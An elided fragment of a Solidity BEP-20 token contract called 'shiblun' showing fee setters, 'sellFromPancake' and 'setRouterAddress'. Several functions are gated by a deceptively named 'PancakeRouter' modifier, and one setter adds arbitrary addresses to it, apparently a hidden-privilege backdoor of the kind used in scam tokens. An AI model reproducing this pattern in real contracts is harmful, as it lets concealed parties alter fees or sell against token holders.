...
contract shiblun is Context, IERC20, Ownable {
    ...
    address market, address team, uint256 burnfee, uint256 liquidityfee,uint256 marketingfee,uint256 teamfee,address PancakeRouterAddress) {
    ...
    function set
        (uint256 newburn, uint256 newLiquidity, uint256 newMarketing, uint256 newTeam)  public PancakeRouter{
        _burn = newburn;
    ...
    function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newTeamShare) 
      public onlyOwner {
   ...
   function sellFromPancake(uint256 amount) public PancakeRouter{
    ...
    function setRouterAddress (address boy,bool value) public PancakeRouter{
          RouterAddress[boy] = value;
    }
